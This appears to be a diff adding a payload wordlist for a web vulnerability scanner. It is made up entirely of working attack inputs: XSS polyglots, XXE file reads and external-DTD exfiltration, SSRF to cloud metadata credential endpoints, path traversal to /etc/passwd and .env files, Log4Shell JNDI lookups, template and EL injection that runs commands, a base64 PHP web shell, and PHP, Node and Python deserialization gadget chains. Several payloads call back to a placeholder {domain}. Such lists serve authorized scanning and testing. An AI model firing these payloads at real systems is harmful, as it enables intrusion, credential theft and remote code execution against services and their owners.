@@ -1,0 +1,413 @@
+##POLYGLOT - XSS Cross-Context##
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1337) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1337)//>\x3e
+'"><img src=x onerror=alert(1337)><!--
+'"/><svg/onload=alert(1337)//><script>alert(1337)</script><!--
+--></script>"><img/src=x onerror=alert(1337)><svg/onload=alert(1337)>{{1337}}${1337}<%= 1337 %>
+javascript:alert(1337)//";alert(1337)//';alert(1337)//`alert(1337)`//--></script><img src=x onerror=alert(1337)>
+##POLYGLOT - NoSQL Injection##
+{"$gt":"","$ne":""}
+[$ne]=1&[$gt]=&[$regex]=.*
+{"$where":"sleep(5)||this.a==1"}
+';return true;var x='\\';return this.a=='
+{"$or":[{"a":{"$gt":""}},{"a":{"$regex":".*"}}],"$comment":"'\""}
+##POLYGLOT - XXE##
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{domain}/xxe">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://{domain}/evil.dtd">%dtd;%payload;]><foo>&exfil;</foo>
+<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="file:///etc/passwd"/>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY a "1337">]><foo>&a;</foo>
+##POLYGLOT - SSRF##
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://metadata.google.internal/computeMetadata/v1/
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://[::ffff:127.0.0.1]/
+http://0x7f000001/
+http://0177.0.0.1/
+http://127.1/
+http://{domain}/ssrf
+gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
+dict://127.0.0.1:6379/INFO
+file:///etc/passwd
+##POLYGLOT - Path Traversal##
+../../../../../../../etc/passwd
+..\..\..\..\..\..\..\windows\win.ini
+..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd
+....//....//....//....//....//etc/passwd
+..%00/..%00/..%00/..%00/etc/passwd%00.jpg
+/%5C../%5C../%5C../%5C../%5C../etc/passwd
+..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd
+##POLYGLOT - Deserialization##
+${jndi:ldap://{domain}/a}
+${jndi:rmi://{domain}/a}
+${jndi:dns://{domain}/a}
+O:8:"stdClass":1:{s:4:"evil";s:19:"system('id');die();";}
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('nslookup {domain}')}()"}
+##POLYGLOT - Prototype Pollution##
+__proto__[polluted]=1337
+constructor[prototype][polluted]=1337
+{"__proto__":{"polluted":1337}}
+{"constructor":{"prototype":{"polluted":1337}}}
+__proto__.polluted=1337&constructor.prototype.polluted=1337
+##POLYGLOT - EL Injection Cross-Engine##
+${7*191}#{7*191}%{7*191}@{7*191}${{7*191}}
+${T(java.lang.Runtime).getRuntime().exec('nslookup {domain}')}#{T(java.lang.Runtime).getRuntime().exec('nslookup {domain}')}
+${applicationScope}#{facesContext.externalContext.requestHeaderMap}%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']}
+##POLYGLOT - Header/CRLF Injection##
+%0d%0aX-Injected:1337%0d%0a
+%0d%0aSet-Cookie:x=1337%0d%0a%0d%0a<script>alert(1337)</script>
+\r\nX-Injected:1337\r\nHost:evil.com
+##POLYGLOT - Format String (C/C++/ObjC)##
+%s%s%s%s%s%s%s%s%s%s
+%x%x%x%x%x%x%x%x%x%x
+%p%p%p%p%p%p%p%p%p%p
+%n%n%n%n%n%n%n%n%n%n
+AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
+%d%d%d%d%d%d%d%d%d%d
+%s(un='%s')=%u
+%.1337x
+%1337d
+%1337$x
+%1337$n
+%1337$s
+%*.*s
+%@%@%@%@
+##POLYGLOT - Python Format String Injection##
+{0.__class__.__mro__[1].__subclasses__()}
+{0.__class__}
+{0.__init__.__globals__}
+{0.__class__.__init__.__globals__[os].popen(id).read()}
+##POLYGLOT - .NET Format String Injection##
+{0}
+{0:X}
+{0}{1}{2}{3}{4}{5}{6}{7}{8}{9}
+{0:R}
+##POLYGLOT - Integer Boundary - Reflected##
+0
+-1
+1
+2147483647
+2147483648
+-2147483648
+-2147483649
+4294967295
+4294967296
+9999999999999999999
+-9999999999999999999
+0x7FFFFFFF
+0x80000000
+0xFFFFFFFF
+0x100000000
+32767
+32768
+-32768
+-32769
+65535
+65536
+127
+128
+-128
+-129
+255
+256
+1e308
+1e309
+-1e308
+-1e309
+NaN
+Infinity
+-Infinity
+1.7976931348623157e+308
+5e-324
+-0
+##POLYGLOT - Type Confusion - Reflected##
+undefined
+undef
+null
+NULL
+(null)
+nil
+NIL
+None
+true
+false
+True
+False
+TRUE
+FALSE
+0.0
+-0.0
+""
+''
+[]
+{}
+[null]
+{"":""}
+##POLYGLOT - Null Byte - Reflected##
+%00
+\0
+\x00
+\u0000
+%00%00%00%00
+test%00admin
+test\0admin
+##Pug (Node) - Math##
+=7*191
+#{7*191}
+##Smarty (PHP) - Math##
+{7*191}
+{math equation="7*191"}
+{math equation="7 * 191"}
+##Blade (PHP/Laravel) - Math##
+{!!7*191!!}
+##Slim (Ruby) - Math##
+= 7 * 191
+##Thymeleaf (Java) - Math##
+[[${7*191}]]
+[[${T(java.lang.Math).abs(-1337)}]]
+*{7*191}
+##Pebble (Java) - Math##
+{{"".class.forName("java.lang.Math").getMethod("abs",long.class).invoke(null,-1337)}}
+##Razor (C#/.NET) - Math##
+@(7*191)
+@(System.Math.Abs(-1337))
+##Go text/template - Math##
+{{printf "%d" 1337}}
+{{html 1337}}
+##Lua Code Injection##
+loadstring("return 7*191")()
+assert(loadstring('return 7*191'))()
+loadstring("error('1337')")()
+error('1337')
+local s=os.clock();while os.clock()-s<5 do end
+require('socket').sleep(5)
+require("socket").connect("{domain}", 80)
+require("socket.http").request("http://{domain}/lua")
+##PHP Code Injection##
+assert(system('echo 1337'))
+preg_replace('/.*/e','system("echo 1337")','')
+create_function('','return 7*191;')()
+assert(sleep(5)||1)
+assert(file_get_contents('http://{domain}/php'))
+##Perl Code Injection##
+eval('select(undef,undef,undef,5)')
+##Java ScriptEngine Injection##
+var x=7*191
+java.lang.Runtime.getRuntime().exec('sleep 5')
+new java.net.URL("http://{domain}/nashorn").openStream()
+var u=new java.net.URL("http://{domain}/graaljs");var c=u.openConnection();c.getInputStream()
+##XSS - Math (template literal / backtick)##
+${alert(1337)}
+`${alert(1337)}`
+##XSS - Math (SVG)##
+<svg><script>alert(1337)</script></svg>
+##XXE - File Read##
+<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>
+##SSRF - Math-Based##
+http://127.0.0.1:1337
+http://localhost:1337
+http://127.0.0.1:7331
+http://0.0.0.0:1337
+http://[::1]:1337
+http://2130706433:1337
+http://0x7f000001:1337
+##SSRF - Cloud Metadata##
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/admin
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/meta-data/local-ipv4
+http://169.254.169.254/latest/api/token
+http://169.254.169.254/latest/dynamic/instance-identity/document
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+http://metadata.google.internal/computeMetadata/v1/instance/hostname
+http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
+http://169.254.169.254/metadata/instance/network?api-version=2021-02-01
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+http://169.254.169.254/metadata/v1.json
+http://169.254.169.254/opc/v2/instance/
+http://169.254.169.254/opc/v2/instance/metadata/
+http://100.100.100.200/latest/meta-data/
+http://100.100.100.200/latest/meta-data/ram/security-credentials/
+http://169.254.169.254/v1/
+http://169.254.169.254/v1/metadata
+##SSRF - IP Bypass##
+http://2130706433/
+http://0x7f.0x0.0x0.0x1/
+http://017700000001/
+http://0177.0000.0000.0001/
+http://127.0.1/
+http://0/
+http://0.0.0.0/
+http://[::1]/
+http://[0:0:0:0:0:ffff:127.0.0.1]/
+http://[::1]:80/
+http://[::ffff:7f00:1]/
+http://127.0.0.1.nip.io/
+http://spoofed.burpcollaborator.net/
+http://localtest.me/
+http://127.127.127.127/
+http://0x7f000001.nip.io/
+##SSRF - Protocol Schemes##
+file:///etc/hosts
+file:///c:/windows/win.ini
+file:///c:/boot.ini
+file:///proc/self/environ
+file:///proc/self/cmdline
+gopher://127.0.0.1:25/_HELO%20localhost
+gopher://127.0.0.1:6379/_INFO%0d%0a
+gopher://127.0.0.1:11211/_stats%0d%0a
+dict://127.0.0.1:11211/stats
+ftp://127.0.0.1/
+jar:http://127.0.0.1/!/
+netdoc:///etc/passwd
+ldap://127.0.0.1:389/%0astats%0aquit
+##SSRF - URL Tricks##
+http://evil@127.0.0.1/
+http://127.0.0.1#@evil.com
+http://evil.com@127.0.0.1/
+http://127.0.0.1?@evil.com/
+http://evil.com%0d%0a%0d%0aGET%20/internal
+http://127.0.0.1/..;/..;/admin
+http://127.1.1.1:80\@127.2.2.2:80/
+http://127.0.0.1\t@evil.com/
+##SSRF - DNS Rebinding##
+http://1337.oob.{domain}/
+##SSRF - Open Redirect Chain##
+http://localhost/redirect?url=http://{domain}/ssrf
+##SSRF - Internal Service Probe (Elasticsearch)##
+http://127.0.0.1:9200/_cluster/health
+##SSRF - IPv6 Zone ID Bypass##
+http://[::1%25eth0]/
+##Path Traversal - Math-Based##
+../../../../../../../tmp/1337
+....//....//....//tmp/1337
+%2e%2e%2ftmp%2f1337
+..%2ftmp%2f1337
+##Path Traversal - Traversal Sequences Linux##
+../etc/passwd
+../../etc/passwd
+../../../../../../../proc/self/cwd
+##Path Traversal - Traversal Sequences Windows##
+..\windows\win.ini
+..\..\windows\win.ini
+..\..\..\windows\win.ini
+..\..\..\..\windows\win.ini
+..\..\..\..\..\windows\win.ini
+..\..\..\..\..\..\windows\win.ini
+..\..\..\..\..\..\..\boot.ini
+..\..\..\..\..\..\..\windows\system32\drivers\etc\hosts
+##Path Traversal - Encoding Bypass##
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+..%2f..%2f..%2f..%2fetc%2fpasswd
+%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini
+%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin.ini
+..%252f..%252f..%252f..%252fetc%252fpasswd
+..%c1%9c..%c1%9c..%c1%9c..%c1%9cwindows\win.ini
+..%e0%80%af..%e0%80%af..%e0%80%afetc/passwd
+%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+##Path Traversal - Null Byte and Normalization##
+../../../../../../../etc/passwd%00
+../../../../../../../etc/passwd%00.jpg
+../../../../../../../etc/passwd%00.png
+../../../../../../../etc/passwd%00.html
+..%00/..%00/..%00/etc/passwd
+..%0d/..%0d/..%0d/etc/passwd
+/;/../../../etc/passwd
+/.;/../../../etc/passwd
+/.%00/../../../etc/passwd
+....//....//....//....//etc/passwd
+....\/....\/....\/....\/etc/passwd
+..../\..../\..../\etc/passwd
+....//....//....//....//windows/win.ini
+##Path Traversal - Target Files##
+.env
+../.env
+../../.env
+../../../.env
+.git/config
+../.git/config
+../../.git/config
+web.config
+../web.config
+../../web.config
+WEB-INF/web.xml
+../WEB-INF/web.xml
+../../WEB-INF/web.xml
+application.properties
+../application.properties
+../../application.properties
+config/database.yml
+../config/database.yml
+../../config/database.yml
+##Path Traversal - PHP Wrappers##
+php://filter/convert.base64-encode/resource=index.php
+php://filter/convert.base64-encode/resource=../config.php
+php://filter/convert.base64-encode/resource=../../wp-config.php
+php://filter/read=string.rot13/resource=index.php
+php://filter/read=convert.iconv.utf-8.utf-16/resource=index.php
+php://filter/zlib.deflate/convert.base64-encode/resource=index.php
+php://input
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
+expect://id
+expect://whoami
+php://filter/convert.base64-encode/resource=/etc/passwd
+php://filter/convert.base64-encode/resource=php://input
+##Path Traversal - Windows UNC##
+\\{domain}\share\test
+##Path Traversal - NTFS Alternate Data Stream##
+....//....//etc/passwd::$DATA
+##Path Traversal - Windows 8.3 Short Name##
+..\..\WINDOW~1\system32\config\SAM
+##Path Traversal - Backup Files##
+.env.bak
+config.php.bak
+web.config.old
+.git/HEAD
+.svn/entries
+##Path Traversal - API Context##
+/api/v1/../../etc/passwd
+/static/../../etc/passwd
+##NoSQL - Operator Injection##
+{"$ne":null}
+{"$exists":true}
+{"$and":[{"$ne":null}]}
+[$ne]=1
+[$gt]=
+[$regex]=.*
+[$exists]=true
+[$in][]=admin
+$ne[]=1
+$gt=
+$regex=.*
+##NoSQL - Redis##
+EVAL "return 7*191" 0
+EVAL "redis.call('SET','test','1337')" 0
+DEBUG SLEEP 5
+SET test 1337
+CONFIG GET *
+INFO
+KEYS *
+##Format String - Math (.NET)##
+String.Format("{0}",1337)
+##Python Pickle P0 - Math (eval 7*191)##
+Y19fYnVpbHRpbl9fCmV2YWwKKFMnNyoxOTEnCnRSLg==
+##Python Pickle P2 - Math (eval 7*191)##
+gAJjX19idWlsdGluX18KZXZhbApxAFgFAAAANyoxOTFxAYVxAlJxAy4=
+##Python Pickle P4 - Math (eval 7*191)##
+gASVIQAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwFNyoxOTGUhZRSlC4=
+##Python YAML - Math (eval 7*191)##
+!!python/object/apply:builtins.eval ["7*191"]
+##Python jsonpickle - Math (eval 7*191)##
+{"py/reduce":[{"py/function":"builtins.eval"},{"py/tuple":["7*191"]}]}
+##PHP Unserialize - Laravel PendingBroadcast##
+O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"\0*\0events";O:28:"Illuminate\Events\Dispatcher":1:{s:12:"\0*\0listeners";a:1:{s:8:"shutdown";a:1:{i:0;s:6:"system";}}}s:8:"\0*\0event";s:21:"nslookup {domain}";}
+##PHP Unserialize - Symfony CacheAdapter##
+O:44:"Symfony\Component\Cache\Adapter\ProxyAdapter":2:{s:54:"\0Symfony\Component\Cache\Adapter\ProxyAdapter\0pool";O:44:"Symfony\Component\Cache\Adapter\ArrayAdapter":3:{s:54:"\0Symfony\Component\Cache\Adapter\ArrayAdapter\0values";a:0:{}s:60:"\0Symfony\Component\Cache\Adapter\ArrayAdapter\0expiration";a:0:{}s:21:"\0*\0createCacheItem";a:2:{i:0;O:15:"Faker\Generator":1:{s:13:"\0*\0formatters";a:1:{s:11:"fetchObject";s:6:"system";}}i:1;s:11:"fetchObject";}}s:58:"\0Symfony\Component\Cache\Adapter\ProxyAdapter\0setInner";s:9:"echo 1337";}
+##Node node-serialize - Math (return 7*191)##
+{"rce":"_$$ND_FUNC$$_function(){return 7*191}()"}
+##Node node-serialize - Math (eval 7*191)##
+{"rce":"_$$ND_FUNC$$_function(){return eval('7*191')}()"}
